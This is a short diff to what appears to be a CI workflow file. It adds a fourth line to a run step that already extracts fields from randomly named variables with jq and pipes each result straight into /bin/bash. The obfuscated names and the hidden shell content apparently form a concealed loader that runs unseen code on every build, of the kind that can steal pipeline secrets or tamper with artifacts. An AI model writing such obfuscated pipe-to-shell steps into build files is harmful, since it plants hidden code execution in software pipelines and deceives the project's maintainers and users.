@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$evvl0" | jq -r .mil136 | /bin/bash
           echo $fhsl0070 | jq -r .dnure82 | /bin/bash
           printf '%s' "$wyj0" | jq -r .wqti6 | /bin/bash
+          echo $lotc31 | jq -r .livq416 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
